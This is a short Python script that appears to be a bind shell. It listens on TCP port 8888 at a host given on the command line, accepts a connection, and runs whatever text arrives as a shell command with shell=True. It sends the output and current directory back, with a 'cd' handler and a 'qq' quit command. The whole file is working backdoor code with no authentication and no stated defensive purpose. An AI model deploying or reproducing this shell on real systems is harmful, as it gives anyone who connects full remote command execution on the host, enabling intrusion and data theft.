import os
import socket
import subprocess
import sys

print(sys.argv[1])
# host = socket.gethostname()
# print("ha", socket.gethostbyaddr())
host = sys.argv[1]
print(host)
port = 8888
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Binding to the Port " + str(port))
print("Waiting for client to connect")
s.bind((host, port))
s.listen(5)
conn, address = s.accept()
print("Connection has been established | " + "IP " +
      address[0] + " | Port " + str(address[1]))
data = ''
while True:
    data = conn.recv(1024)
    print(data)
    if data.decode('utf-8') == "qq":
        print("Connection closed by client\n")
        exit(0)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
        conn.send(str.encode("Directory changed"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')

        conn.send(str.encode(output_str))
        conn.send(str.encode(str(os.getcwd()) + '$'))
        print(output_str)
